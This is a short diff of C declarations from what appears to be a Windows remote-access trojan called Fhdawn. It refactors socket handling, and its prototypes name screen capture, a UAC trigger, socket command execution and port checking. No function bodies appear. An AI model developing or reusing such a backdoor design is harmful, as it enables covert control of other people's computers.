@@ -26,18 +26,16 @@ Modified: -
 #define BUFFER 1024
 // I don't feel good about declaring these static.
 static BOOL connected = FALSE;
-static struct sockaddr_in server;
-static SOCKET sockfd;
-static char recvbuf[BUFFER];
+char recvbuf[BUFFER];
 //=====================
 void ReportError(void);
 void WSAReportError(void);
 
-int CaptureAnImage(HWND hWnd);
+int CaptureAnImage(HWND hWnd, SOCKET sockfd);
 void TimeStamp(char buffer[100]);
 BOOL IsAdmin();
 //=====================
-void sockprintf(SOCKET sock, const char* words, ...);
+void sockprintf(const char* words, ...);
 void UACTrigger();
 char* FhdawnInfo();
 BOOL isFile(const char* file);
@@ -50,7 +48,7 @@ void fhdawn_main(void);
 void MainConnect(void);
 void sockSend(const char* data);
 DWORD ProcessId(LPCTSTR ProcessName);
-void ExecSock(void);
+void ExecSock(SOCKET sockfd);
 void CheckHost(const char* ip_address);
 void checkPort(const char* ip, int port);
 const char* IP2Host(const char* IP);
